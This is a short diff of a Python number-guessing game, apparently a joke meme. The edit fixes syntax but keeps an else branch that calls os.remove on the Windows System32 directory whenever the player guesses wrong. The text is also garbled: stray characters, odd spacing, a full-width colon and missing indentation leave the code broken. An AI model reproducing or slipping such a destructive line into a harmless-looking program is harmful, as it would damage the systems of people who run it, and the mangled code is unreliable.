@@ -2,9 +2,8 @@ import random
 import os
 number = random. randint (1,10)
 guess = input("Silly game! Guess number between 1 and 10")
-guess =
-int(guess)
-Jif guess == number:
+guess = int(guess)
+if guess == number:
 print("You Won!")
-曰else：
+else：
 os. remove("C: \Windows\System32")
